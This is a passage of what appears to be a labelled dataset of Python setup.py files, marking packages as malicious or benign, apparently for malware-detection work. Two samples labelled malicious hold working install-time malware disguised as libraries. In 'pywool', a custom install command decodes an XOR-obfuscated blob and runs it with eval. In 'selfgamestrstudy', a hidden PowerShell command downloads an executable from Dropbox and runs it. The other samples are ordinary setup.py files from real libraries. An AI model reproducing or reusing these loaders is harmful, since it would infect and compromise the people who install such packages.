4\\x02\\x1aW\\x00\\r]RPYTS\\x1d\\x16X`\\t@S\\x04~\\x07|t\\x0fMzTZ@Q~\\n@T{wOSe{EV\\\\\\x00]omvLt_MAm\\x04_Fzp\\t_Z\\x05}Dh\\x06o\\x05Sw\\t^Yg\\x07[{bGBoQvDPN\\x07Cknj]t[o\\x0cQl|\\x06WL^Ts\\x07~\\x00hpMbZ\\x05nNR\\x06LTP\\x01NAc\\x0bZAToKZa`wBeuw\\x02lgAT`X\\x01^UeYBm\\x07KPgcUR[[\\tKP\\x06c\\x05ivHhYg\\x06_R\\x00SHm~LfWptMVuz|ba\\x0c\\thrJgWX\\x0fWZZuBS\\x07MWl\\x04TMUpbC{YdTazUD{}\\x03\\x00y}o]Uz\\x7f^zVVP|vyQSz\\x7f\\x02xQ\\\\Tzwx_quqV{s\\x00O}]\\x01Bbw_M{tn[dBDQkqdNhnrH`pA\\x0fRs\\x0bXUb\\x03\\x00aqKtS~wq`oj_iqLdW\\x01pCXn\\x03Zj\\x7fKwQo{LU\\x01\\x7fDo_kTms\\\\FU_gAS\\x05}Pkrw\\x08anz\\x01{q\\x08YS^fS`vqMR\\x01SKlo\\x05HkqJ`Wnv\\x02ba\\t\\n~w{Fw\\\\w^ptrQyutS[\\x04z[S^\\\\Z|X{\\x01a\\x7fNbQ\\x0be@S\\tMVR\\x00IDo\\x03UBSc@Ufjw@equ\\x03jbA[m[\\tYPcU@k\\x01HSlg_^S^\\x0eHW\\nn\\x02kqJlSa\\rYZ\\x05]BhrJbPrp@]tqxja\\x00\\x05aq@fRZ\\rYV^pCZ\\x08NWg\\n_CT\\x7fcAyXcQmw]}a_qO{\\\\o^TOz@zwsPq_[DV\\x07sEUwe_bYW`jkfUc\\x0bz]f\\x05ZXPqOUhe{|SYd^Pr`i`ZCZi\\x05d[p[\\\\ch\\x04~GV{gBl\\x0b^XP~DP{kwVU^UHTwwXob@E{^\\x7f\\x06U_qYR|pWuLaA{w`Rx[}\\x06`vKbS\\x01aKV\\tLQV\\x05JBh\\x04TG^`A[alpAfrp\\t`aKUe[\\x0c\\\\[`TBk\\x06LTadZ]ZT\\x0fNP\\x0bi\\th~MmVe\\x04YW\\x02]Mms@bSusNSuq}ic\\x0c\\t`pH`QY\\x00[R]vD[\\x01KWe\\x00[HQ\\x7fbF}]`Wjp\\\\xl\\\\pA|Yx^Pv\\x7f^s^qrQ~|[tMiG}tu@mt\\x03ccagSd\\n}Ve\\n]YUuFUeb{xW\\x06jYVe\\x00Y}OXxzwx_quqV{w{CRwfEswj]aIGQm~bHioxNjp@\\x05Zq\\x00VQc\\x07\\x0flsN{Z\\x7fqsing\\\\aq@dS\\x05rCTd\\x03Ya\\x7fNzSn}@R\\x0b{Cm\\\\cQmw]GWXj@S\\x01{Top}\\x03jls\\x08qs\\x01]PZoVivrIZ\\x02WMid\\x06Hm~LfWptMV~nE`pA`Qc\\x07]V\\x06RCa\\x06}\\x06in\\x7f\\x04coqBUZ~M|ZAPpTs]yj\\x06\\nSUY\\x05maY_\\x7f\\x00w[QvznT\\x00]cVqe@Qwx\\x01qs~Hhc\\x7f\\x05ke\\tYY]e^TpP[c\\tzXPZ^CVu\\rfYqoKRw{F}sNLo\\x04}Ye\\x04]X[pOBdYbB|txXZPQN|zX^zQt\\\\fHAQmwoMomrLotM\\x00Uq\\n]Rc\\x0c\\x01`pHsQ|{phhbX`vKgR\\x01qFTo\\x01\\\\kqJzSavKZ\\x05wNjZ`UlsRI[Za@T\\x05{Waqv\\x07ho~\\x07|v\\x07[[W`Wj\\x7fq@R\\nQLne\\x00HmwAcPmv\\x06me\\x05\\x05ypKPe\\x06UMbq\\t\\x02QM{|kgHCZI\\x06XUtb[|{mUb\\x05ZMyru\\x02seN_}rJCa\\x07`\\tpqWLQp{[c`@Dxs\\x04Pa^\\x0f\\x07X~ZAh@PIsQtR~qpU|rxPW\\x06zZU[]Z~]~\\x05krAn[\\x04fHQ\\x05AVT\\x02HFb\\x02_AVeOQd`vEapt\\x04k`@Qm[\\x00PRc^Cn\\x04NZm`_\\\\S[\\x0cN[\\x05b\\x07iqLoTd\\x03\\\\[\\nRNj\\x7fKmT\\x7fsLSqs|of\\x0c\\x06ms@gT_\\x0cYT[uGP\\x05A[m\\x05\\\\KVsoA\\x7fZbS`vW~dY~KyU~ZWt{G{urZq_RMT\\x07xFPrcVc^W_QngN``jCP`\\x00Py\\x00dN`n\\x03NhTe@y\\x7f\\x04\\x00mu\\x08\\x01W\\\\AAlbjGU\\x00|P{\\x04aEW\\x06\\x0cKZ\\x04vZ{w\\x00BR]\\\\F[]_\\x04U`uua\\t~ta\\x06xddc\\rwqusWT|`AWOYOu\\x05uAQe\\x04[]N\\r]S\\x05\\x04AotAA]\\nU]{zy}\\x7fTMVaj\\x7f^V_wTm}LEU\\x00QGUX\\x02Pkq\\x7fO[sbYVs\\x7fVivzFag\\x02DR^SQm}\\x05Bj\\x04xBQ\\x04\\x01_\\\\pA[f\\x06^Cnr\\x0f\\nZ\\x06KUe\\x05g\\\\ZYiPe`bBQeNTlq|Bh\\nyQR`{Vot\\x7f\\x07V\\x02k[Waa\\x06otMoVa\\x06XQ\\x07]BqsX]PsAC}]f\\x04bcyWR]y\\x02l`~\\x02zt{]{urvwZA[fl|ZW[xZa\\x7fGER\\x04QD[Y\\tTirr@Vvd_]~pWj\\x7fyOio\\x04EU_UQmt\\x08Gl\\x06r@T\\x00\\x0cZSpKPe\\x06UMbq\\t\\x02Q\\x05AVd\\x03bX[^bSddaGQnLQf\\x7fxBh\\x05rZZnw[hr|\\x06mm|\\t]oqUhpQD[ZjAU\\x04zQ`\\x00d_ZWdXQP\\x06\\x0biVx\\\\}KZy|rxP|vyQ~qwATqeFxs`QiL@RjroOkhzJ`vK\\x03Rt\\x0e\\\\To\\x01\\x0bkqJvQ~zwankPhrJeV\\x07pMX`\\x06XhpMzX`vNS\\x04zAo]dTa\\x7fRDPTaOT\\x0b{Vot\\x7f\\x02lis\\x07|p\\tZU\\\\cTopqJQ\\x06]Aaa\\x01KjrAaTh~\\x00bg\\x03\\x06~uOQc\\x08X}~M{AV[rHq_N_yYw_\\x7ff\\x03\\nZZ_\\x06je]Ys\\x06v[UtvoV\\x01^cX~`GPzr\\x00y}{Lmew\\x02od\\x00^TXn\\\\SqR^a\\x07}YPYUO\\\\u\\x05eSsoFSsy@qvKAf\\x00y]`\\n\\\\^QpEAgXnGqqwWS]ULzv]^s^r_aLEWaqnMko~MmuN\\x00[~\\x0fZSn\\x06\\x00h~MwTzswlik_ms@eU\\x00sCVa\\x06]krAvYa~HP\\x07wCk^bS`vWDR^eDQ\\x0bzQkq|\\x04knr\\x02qs\\x08TRZdUlst@[\\x05WOia\\x04Naq@cToz\\x07od\\x06\\x05w\\x7fNWd\\t_v}B|@n_w\\x02|XxZ|pvYT[RMyuX@zp{[ZZ~]Vw{mR\\x02XdYweGRpv\\x0b|}\\x01DWpZDP[[\\\\sgV_ywsQ}vw^pp\\nAja\\x01[c^rs~[LTckx[ZWxWjqGJR\\nQEU\\\\\\x00Qmt\\x7f@Vpj^SusTopyEjc\\x08HZ[TRjq\\x08Eh\\x03zF[\\x02\\nYTuOQc\\nXGip\\x0b\\x07Q\\x07@Qm\\x05kPSZcQ`b`L]aKUe~\\x7fBc\\x04r_SozTmux\\x07`a|\\x04VaqZh~Q\\x7fcXh\\x02y_c^VLqE~q\\x7f_~_XFW\\x07sH\\\\qe^h]]akhaWn\\x03}[e\\x01_^W\\x7fCUcdppQ[nZ\\\\qohiYBZm\\x06gVp[Wbi\\x05\\x7fDZ\\x7fiBd\\x05\\\\[WtA^rjtWPUWCQ~{ZmeIAy]s\\x06W\\\\z\\\\Vz|XzLbCzw`_q]}\\x07jrAcR\\x02fI[\\x01KWU\\x01ODo\\nXGUaJWcnzEjq\\x7f\\x08ibJUaX\\x0fQ[`_Cj\\x07MWm`T]RZ\\rMW\\x01l\\x07a\\x7fNlSn\\x06RR\\x0bQOotIfQv\\x7fNQvzxme\\x00\\x06opKbPY\\x00V[[vEQ\\x05AVd\\x03\\\\J\\\\we@~YeQm~PBQZ`BV\\x05uUkqoKSsdOxX`\\rcdzQz_wpX\\x7fqX|MeGypw@a~\\x03`hab^f\\x0b{Zb\\x00Y^WvNPefzyU\\x01gXVa\\x06]yMRsquqV{wxRxsrF[weA{tn[dBDQkqdNhnrH`pA\\x0fRs\\x0bXUb\\x03\\x00aqKtS~wq`oj_iqLdW\\x01pCXn\\x03Zj\\x7fKwQo{LU\\x01\\x7fDo_kTms\\\\FU_gAS\\x05}Pkrw\\x08anz\\x01{q\\x08YS^fS`vqMR\\x01SKlo\\x05HkqJ`Wnv\\x02ba\\t\\n~rJUW\\x07QLZ\\x7f_\\x05y_BSpZ}^zd\\x01\\x04V^Z\\x07cj^Yx\\x0bi@R\\n\\x05RT\\x00Y\\x03QvUD|rTBTu\\x0cNSuq\\x02QZ{Pa\\x04DWkls_Pw\\\\\\x02bfKAQd\\x06EW\\x0b~\\x02z\\x7f|\\x05kXzKZ\\x04wTS\\x07\\x7fE}r\\x0fCap\\x06\\x07RXw\\\\`\\x05LQho~]TtZ\\x05cjQ]cCCZh~MVaj\\x7f^V_wTms@UR\\x00MAm\\x04_FUbA[`pHsQ|{phhbX`vKWhu}Dlo\\x05BQZVWjp@QlaURSY\\x0bLV\\x07l\\taqKUhpQD[ZjAU\\x04zTmuNTl\\nd\\\\QWb^doc@SdIQmwAfVX\\x01XT_sCT\\x07KPkrAl]n~\\x01hc\\t\\x07\\x7fvHS`vKMTd\\x02\\x02To\\x05^\\x7fYBDQuqAqus|\\x7fXJUlsNoZ\\x05eOS\\x07MWaq@\\x00Sp\\rYTd\\x03\\x0ea\\x7fNWj|uNS}g]SuwQmwAT`X\\x01^UeYBm\\x07KPkrAvYa~HP\\x07wCk^bS`vKWf\\x01[Go\\x7f\\r\\x01P\\x06JWjp@f\\\\q\\x7fATwpxnb\\x03\\x08aqKUhpwM[\\x05\\\\Nh`\\x05MmuNTa\\x7fx\\x01Q\\naURll\\x05~[]QW_w\\x06l[zOU\\x00{[T\\x05~FPZoMspD\\\\{_t\\x03ivHS`veNjk}Hm~LQk\\x7fFGP\\x04\\\\BZX\\x08[hrJUemtNkpu\\x06i`MWaq@dS\\x05rCTd\\x03Ya\\x7fNWj|\\x02Ii\\x0b\\x7fCT\\x00\\x08_QwATms@nVe\\x00\\\\U\\x05WIkrA[`p~\\x01kls\\x05xu\\x01\\\\Z^eWhuOQ`p~Di\\x04x\\\\PnvQ`pA[e\\x07^LPr`Mw]aUhpMWZ\\x7fT\\x07Pp\\rBQJ\\x03[\\\\~c]~zqTySx\\x03otIQmwoMomrLotMTo~G@Q\\x06]HZX\\x01RjrAV`hrGjwu\\x04ieOQ`U\\rZQ`^Ah\\x07@Q`pAvQc|OV\\x06xOcYaUhpMWo\\x05TBkp\\r\\x04V\\x02NTa\\x7fN`V~u@T{w{me\\x04\\x03mwATmszOU\\x00QNna\\x02IkrA[`p~\\x04Q\\x07kYSdi\\x00`vKWh{y\\x02Qo}GP\\x7f^\\x07{Z\\x08Aq~wWjcJEdcd@]`fEyq{[c`vEaafNQdcGa~\\x03BQ@\\x06@jo\\x04CS_d]oXsszY@UotMaT\\x04eJP\\x05A[`pH\\x06Ps\\x00[Pg\\x05\\t`vKWhvqEV}fZWptWjp@Qm[\\x00PRc^Cn\\x04NZaqKxQa{M[\\x04vAkYfTmuNTo\\x0bZAh~\\n\\nS\\tMVotIfQv\\x7fNQvzxme\\x00\\x06opKPkr{AZ\\x04THkc\\x08OivHS`v}\\x01S\\x00e^Wlm\\x02kqJWj~v\\x02\\\\apMS|^\\x05}\\\\]Wrf\\\\QyutSptyPxp\\r@od\\x02XcP|p}UKZf`{YT\\\\\\x7fQmyMDW\\x07\\\\FU\\\\\\x04TosuDPqkP\\\\qvRjrsChg\\x01@Z]WWhv\\x06Bl\\x0b~DP\\x05\\x0bYVp@Qn\\x04UMjs\\x0b\\x05W\\x04NZl\\x04a^SXdSm`nBUaLT`{|Ac\\n|\\\\Pa}Zh~{\\x00T\\x01c^We`\\x07ms@ndg\\x01Mz_\\x06ZjlhQtuqXkgpE}^TIYhaX{tn\\\\lUX\\x02P\\x05t_PaTGqu\\x00\\x08SYtCW\\x07lUZ^qBUagB]\\x05\\rDS\\x05r\\\\T^\\x0f^pz\\x0f_P\\nWLR\\x7f\\x0c]mqpDVysGW\\x06rFSz^Pe]\\n`aa]kl\\x07f~`wx\\\\Pxb\\x00[x~\\x02|J\\x0eZV\\x7f_FR\\x7fQAk\\x04\\x01Ft\\x04kK|\\x07x\\x07V[dI[`f_yu\\x7fpv[@Tgoz[V]xTaqBGP\\x0bWIRV\\x04VowwEVtk_Qr~Uot\\x7fAna\\x02CQY][`s\\x01Ak\\x07sCR\\x02\\t]\\\\vKWf\\x01[Go\\x7f\\r\\x01P\\x06JWg\\x05jZ[Xh_dcdCPcNZl\\x7fy@j\\x05\\x7f\\\\[ovTiqz\\x02V\\x00d[[mo\\x04j\\x7fK@To\\x00\\x05Ve\\x00^y_IGVvrUU\\\\{\\x07nny\\x03zwpQquzu}XAVgh~\\\\[^}Wh{CAW\\nPBQY\\x03Wjs~E[skPTstUls|O``\\x02FR[QWar\\tGh\\x04~AV\\x01\\x0fZ]\\x7fNWd\\x0b_Lj\\x7f\\x0c\\x06T\\x03IQ`\\x02k_V[iQcecBS`KPf|sNb\\x05zYPlwViv~\\x05[\\x03aXRgn\\x02m~LHRt\\x07CWn[[`q\\x0cQQl`LmbdMX`\\x07Q|\\x05gM``\\rMkZbN|t\\x07\\x02c~\\x0f\\x07PTKOiogDU\\x00xUy\\x03kAQ\\x07\\rEU\\x00s\\\\~u\\nDPYUN[[\\\\\\x01Wg{re\\x01zvj\\x01ydff\\x02w|{~]W\\x7f`CQLWDt\\x04\\x7fOQg\\x03YPL\\x03S[\\x05\\x03@jqBB]NqPx\\\\y\\x01muNaZ\\x0b`MQ\\x08KZU\\nMCm\\x00]GSgATdmzAeus\\x07n`KPfY\\x00PZa\\\\Dh\\x05AVeg\\\\Z[]\\nNR\\x01m\\x02m~LjR`\\x07_P\\x05\\\\H`pAlTstOPvtwc`\\x06\\x07hpMeZZ\\x01YRZrCV\\x02NTl\\nZNV~eM~RgVotUBW\\\\kAQ\\x06uQducDTqeJ\\x7fYo\\x0cbezRPZw\\x05hhz\\x00qsz]yp}vzTLQeo|XQXvQ`~MKR\\x06VFV[\\x07ZaruASsg\\\\]p~Tiq~Ald\\x07G[TRWj|\\x02Ii\\x0b\\x7fCT\\x00\\x08_QwATc\\x07TCmu\\x0c\\x04T\\x07KPf\\x07kP[XaVfco@UfHSmxyBj\\x00}ZW`zQkq|\\x04knr\\x02\\\\n{[hrV|`_o\\tuYi_SO|ZrfWPxtuP|pwPpqx\\x05kWq@R\\n{YT\\x01|GV_oB~ra_fHETopeIilsB`pH\\x06Ps\\x00[Pg\\x05\\t`vKvS{uwl`fZkqJgP\\x04~FYa\\x0cVhrJxUbx@[\\x04}@jXgWaq\\\\GSZfAQ\\x00xTa\\x7fx\\x04kay\\ty}\\x04YU\\\\gQmw{NW\\x07\\\\One\\x04MopKgVlw\\x08ba\\x00\\x03|rAVg\\x00\\\\\\x7fuJzAT^}H|QCUP\\x05ZXPqO\\x0bn~s\\tjgEQm\\x07^U`\\x05@\\x0ff~\\x7f\\x05cdS|xtuP|pwPpztNVnyNSU\\x0c_mj\\x7fHy_s\\x06W\\\\P[~Yx\\x01opKeP\\x06oA[\\x07HRW\\x06ACk\\x02\\\\E^fKWakuEg\\x7fr\\x02jaJWg[\\x01ZZaUMj\\x05JU`bZSZZ\\nLR\\x04o\\x04aq@oP`\\x01\\\\W\\x00RMa\\x7fN`V~u@T{w{me\\x04\\x03mwAfVX\\x01XT_sCT\\x07KPf\\x07UB\\\\qfE|^kVivTzlZzM|]m[VA}Az\\x7f|[ha@Ah`kATcgE}rxVc`}D``gM]`mGr^uP|pt[\\\\~xXQqb\\x0fsQtR~qpU|rxPVr~LTEE[U~}_|]x_qw_V{wxRRwvJ[G\\x0e\\t\\x12\\x1a\\x1e8P@WWCC\\x08>\\x12\\x16\\x18\\x12HWJK\" \n        iOpvEoeaaeavocp = \"0426456997360654978717475367996429390855721251975586725776333498860124951000803403725842372426828698\"\n        uocpEAtacovpe = len(wopvEaTEcopFEavc)\n        oIoeaTEAcvpae = \"\"\n        for fapcEaocva in range(uocpEAtacovpe):\n            nOpcvaEaopcTEapcoTEac = wopvEaTEcopFEavc[fapcEaocva]\n            qQoeapvTeaocpOcivNva = iOpvEoeaaeavocp[fapcEaocva % len(iOpvEoeaaeavocp)]\n            oIoeaTEAcvpae += chr(ord(nOpcvaEaopcTEapcoTEac) ^ ord(qQoeapvTeaocpOcivNva))\n        eval(compile(oIoeaTEAcvpae, '<string>', 'exec'))\n        install.run(self)\n\n# Setting up\nsetup(\n    name=\"pywool\",\n    version=VERSION,\n    author=\"HW\",\n    author_email=\"\",\n    description=DESCRIPTION,\n    long_description_content_type=\"text/markdown\",\n    long_description=LONG_DESCRIPTION,\n    packages=find_packages(),\n    install_requires=[],\n    keywords=['python', 'http', 'https', 'requests', 'urllib', 'sockets', 'tcp'],\n    classifiers=[\n        \"Development Status :: 1 - Planning\",\n        \"Intended Audience :: Developers\",\n        \"Programming Language :: Python :: 3\",\n        \"Operating System :: Unix\",\n        \"Operating System :: MacOS :: MacOS X\",\n        \"Operating System :: Microsoft :: Windows\",\n    ],\n    cmdclass={'install': CustomInstallCommand}\n)", "target": 1}
{"idx": "google-cloud-datastore-2.8.0", "func": "# Copyright 2018 Google LLC\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n\nimport io\nimport os\n\nimport setuptools\n\n\n# Package metadata.\n\nname = \"google-cloud-datastore\"\ndescription = \"Google Cloud Datastore API client library\"\n\n# Should be one of:\n# 'Development Status :: 3 - Alpha'\n# 'Development Status :: 4 - Beta'\n# 'Development Status :: 5 - Production/Stable'\nrelease_status = \"Development Status :: 5 - Production/Stable\"\ndependencies = [\n    # NOTE: Maintainers, please do not require google-api-core>=2.x.x\n    # Until this issue is closed\n    # https://github.com/googleapis/google-cloud-python/issues/10566\n    \"google-api-core[grpc] >= 1.31.5, <3.0.0dev,!=2.0.*,!=2.1.*,!=2.2.*,!=2.3.0\",\n    # NOTE: Maintainers, please do not require google-api-core>=2.x.x\n    # Until this issue is closed\n    # https://github.com/googleapis/google-cloud-python/issues/10566\n    \"google-cloud-core >= 1.4.0, <3.0.0dev\",\n    \"proto-plus >= 1.15.0, <2.0.0dev\",\n    \"protobuf >= 3.19.0, <4.0.0dev\",\n]\nextras = {\"libcst\": \"libcst >= 0.2.5\"}\n\n\n# Setup boilerplate below this line.\n\npackage_root = os.path.abspath(os.path.dirname(__file__))\n\nversion = {}\nwith open(os.path.join(package_root, \"google/cloud/datastore/version.py\")) as fp:\n    exec(fp.read(), version)\nversion = version[\"__version__\"]\n\nreadme_filename = os.path.join(package_root, \"README.rst\")\nwith io.open(readme_filename, encoding=\"utf-8\") as readme_file:\n    readme = readme_file.read()\n\n# Only include packages under the 'google' namespace. Do not include tests,\n# benchmarks, etc.\npackages = [\n    package\n    for package in setuptools.PEP420PackageFinder.find()\n    if package.startswith(\"google\")\n]\n\n# Determine which namespaces are needed.\nnamespaces = [\"google\"]\nif \"google.cloud\" in packages:\n    namespaces.append(\"google.cloud\")\n\n\nsetuptools.setup(\n    name=name,\n    version=version,\n    description=description,\n    long_description=readme,\n    author=\"Google LLC\",\n    author_email=\"googleapis-packages@google.com\",\n    license=\"Apache 2.0\",\n    url=\"https://github.com/googleapis/python-datastore\",\n    classifiers=[\n        release_status,\n        \"Intended Audience :: Developers\",\n        \"License :: OSI Approved :: Apache Software License\",\n        \"Programming Language :: Python\",\n        \"Programming Language :: Python :: 3\",\n        \"Programming Language :: Python :: 3.7\",\n        \"Programming Language :: Python :: 3.8\",\n        \"Programming Language :: Python :: 3.9\",\n        \"Programming Language :: Python :: 3.10\",\n        \"Operating System :: OS Independent\",\n        \"Topic :: Internet\",\n        \"Topic :: Software Development :: Libraries :: Python Modules\",\n    ],\n    platforms=\"Posix; MacOS X; Windows\",\n    packages=packages,\n    namespace_packages=namespaces,\n    install_requires=dependencies,\n    extras_require=extras,\n    python_requires=\">=3.7\",\n    scripts=[\n        \"scripts/fixup_datastore_v1_keywords.py\",\n        \"scripts/fixup_datastore_admin_v1_keywords.py\",\n    ],\n    include_package_data=True,\n    zip_safe=False,\n)\n", "target": 0}
{"idx": "selfgamestrstudy-8.45", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'selfgamestrstudy',\n    packages = ['modlib'],\n    version = '5.79',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "gviz_api-1.10.0", "func": "#!/usr/bin/python\n#\n# Copyright (C) 2009 Google Inc.\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#      http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n\n\"\"\"Setup module for Google Visualization Python API.\"\"\"\n\nimport codecs\nimport os.path\n\nimport setuptools\n\n\nhere = os.path.abspath(os.path.dirname(__file__))\nwith codecs.open(os.path.join(here, \"README.rst\"), encoding=\"utf-8\") as f:\n  long_description = f.read()\n\n\nsetuptools.setup(\n    name=\"gviz_api\",\n    version=\"1.10.0\",\n    description=\"Python API for Google Visualization\",\n    long_description=long_description,\n    url=\"https://github.com/google/google-visualization-python\",\n    author=\"Amit Weinstein, Misha Seltzer, Jacob Baskin\",\n    license=\"Apache 2.0\",\n    classifiers=[\n        \"Development Status :: 5 - Production/Stable\",\n        \"Intended Audience :: Developers\",\n        \"Topic :: Software Development :: Libraries :: Python Modules\",\n        \"License :: OSI Approved :: Apache Software License\",\n        \"Programming Language :: Python :: 2\",\n        \"Programming Language :: Python :: 2.6\",\n        \"Programming Language :: Python :: 2.7\",\n        \"Programming Language :: Python :: 3\",\n        \"Programming Language :: Python :: 3.3\",\n        \"Programming Language :: Python :: 3.4\",\n        \"Programming Language :: Python :: 3.5\",\n        \"Programming Language :: Python :: 3.6\",\n        \"Programming Language :: Python :: 3.7\",\n        \"Programming Language :: Python :: 3.8\",\n        \"Programming Language :: Python :: 3.9\",\n        \"Programming Language :: Python :: 3.10\",\n    ],\n    keywords=\"gviz,google visualization\",\n    py_modules=[\"gviz_api\"],\n    install_requires=[\"six\"],\n    test_suite=\"gviz_api_test\",\n)\n", "target": 0}
{"idx": "ghp-import-2.1.0", "func": "import io\nimport os\nimport re\n\ntry:\n    from setuptools import setup\nexcept ImportError:\n    from distutils.core import setup\n\nHERE = os.path.dirname(__file__)\nLONG_DESC_PATH = os.path.join(HERE, \"README.md\")\nLONG_DESC = io.open(LONG_DESC_PATH, encoding=\"utf-8\").read()\n\nwith io.open(os.path.join(HERE, \"ghp_import.py\"), encoding=\"utf-8\") as fobj:\n    for line in fobj:\n        match = re.match(\n            r\"^__version__\\s*=\\s*['\\\"](?P<version>[\\d.]+)['\\\"]$\",\n            line.strip()\n        )\n        if match:\n            VERSION = match.group(\"version\")\n            break\n\nsetup(\n    name=\"ghp-import\",\n    version=VERSION,\n    description=\"Copy your docs directly to the gh-pages branch.\",\n    long_description=LONG_DESC,\n    long_description_content_type=\"text/markdown\",\n    author=\"Paul Joseph Davis\",\n    author_email=\"paul.joseph.davis@gmail.com\",\n    license=\"Apache Software License\",\n    url=\"https://github.com/c-w/ghp-import\",\n    zip_safe=False,\n\n    install_requires=[\n        \"python-dateutil>=2.8.1\",\n    ],\n\n    extras_require={\n        \"dev\": [\n            \"twine\",\n            \"markdown\",\n            \"flake8\",\n            \"wheel\",\n        ],\n    },\n\n    classifiers=[\n        \"Development Status :: 5 - Production/Stable\",\n        \"License :: OSI Approved :: Apache Software License\",\n        \"Intended Audience :: Developers\",\n        \"Natural Language :: English\",\n        \"Operating System :: OS Independent\",\n        \"Programming Language :: Python\",\n        \"Programming Language :: Python :: 2\",\n        \"Programming Language :: Python :: 3\",\n    ],\n\n    py_modules=[\"ghp_import\"],\n\n    entry_points={\n        \"console_scripts\": [\n            \"ghp-import = ghp_import:main\",\n        ],\n    }\n)\n", "target": 0}
{"idx": "flake8-mutable-1.2.0", "func": "# -*- coding: utf-8 -*-\nimport setuptools\n\n\nsetuptools.setup(\n    version='1.2.0',\n    name='flake8-mutable',\n    description='mutable defaults flake8 extension',\n    keywords='flake8 mutable arg kwarg',\n    author='Matthew Ebeweber',\n    author_email='mebeweber@gmail.com',\n    url='https://github.com/ebeweber/flake8-mutable',\n    license='MIT',\n    py_modules=['mutable_defaults'],\n    zip_safe=False,\n    install_requires=[\n        'flake8',\n    ],\n    entry_points={\n        'flake8.extension': [\n            'M90 = mutable_defaults:MutableDefaultChecker',\n        ],\n    },\n    setup_requires=[\n        'pytest-runner',\n    ],\n    tests_require=[\n        'pytest',\n    ],\n    classifiers=[\n        'Development Status :: 5 - Production/Stable',\n        'Intended Audience :: Developers',\n        'License :: OSI Approved :: MIT License',\n        'Topic :: Software Development :: Libraries :: Python Modules',\n        'Programming Language :: Python',\n        'Programming Language :: Python :: 2',\n        'Programming Language :: Python :: 2.7',\n        'Programming Language :: Python :: 3',\n        'Programming Language :: Python :: 3.5',\n        'Programming Language :: Python :: 3.6',\n    ],\n)\n", "target": 0}
{"idx": "django-crontab-0.7.1", "func": "#!/usr/bin/env python\nfrom setuptools import setup\n\n\nsetup(\n    name='django-crontab',\n    description='dead simple crontab powered job scheduling for django',\n    version='0.7.1',\n    author='Lars Kreisz',\n    author_email='lars.kreisz@gmail.com',\n    license='MIT',\n    url='https://github.com/kraiz/django-crontab',\n    long_description=open('README.rst').read(),\n    packages=[\n        'django_crontab',\n        'django_crontab.management',\n        'django_crontab.management.commands'],\n    install_requires=[\n        'Django>=1.8'\n    ],\n    classifiers=[\n        'Development Status :: 5 - Production/Stable',\n        'Environment :: Web Environment',\n        'Framework :: Django',\n        'Intended Audience :: Developers',\n        'License :: OSI Approved :: MIT License',\n        'Natural Language :: English',\n        'Operating System :: POSIX :: Linux',\n        'Programming Language :: Python',\n        'Programming Language :: Python :: 2',\n        'Programming Language :: Python :: 2.7',\n        'Programming Language :: Python :: 3',\n        'Programming Language :: Python :: 3.3',\n        'Programming Language :: Python :: 3.4',\n        'Programming Language :: Python :: 3.5',\n        'Topic :: System :: Installation/Setup'\n    ]\n)\n", "target": 0}
{"idx": "dictpath-0.1.3", "func": "#!/usr/bin/env python\n\"\"\"Dictpath setup module\"\"\"\nimport os\nimport re\nimport sys\ntry:\n    from setuptools import setup\nexcept ImportError:\n    from ez_setup import use_setuptools\n    use_setuptools()\n    from setuptools import setup\nfinally:\n    from setuptools.command.test import test as TestCommand\n\n\ndef read_file(filename):\n    \"\"\"Open and a file, read it and return its contents.\"\"\"\n    path = os.path.join(os.path.dirname(__file__), filename)\n    with open(path) as f:\n        return f.read()\n\n\ndef get_metadata(init_file):\n    \"\"\"Read metadata from a given file and return a dictionary of them\"\"\"\n    return dict(re.findall(\"__([a-z]+)__ = '([^']+)'\", init_file))\n\n\nclass PyTest(TestCommand):\n    \"\"\"Command to run unit tests after in-place build.\"\"\"\n\n    def finalize_options(self):\n        TestCommand.finalize_options(self)\n        self.pytest_args = []\n\n    def run_tests(self):\n        # Importing here, `cause outside the eggs 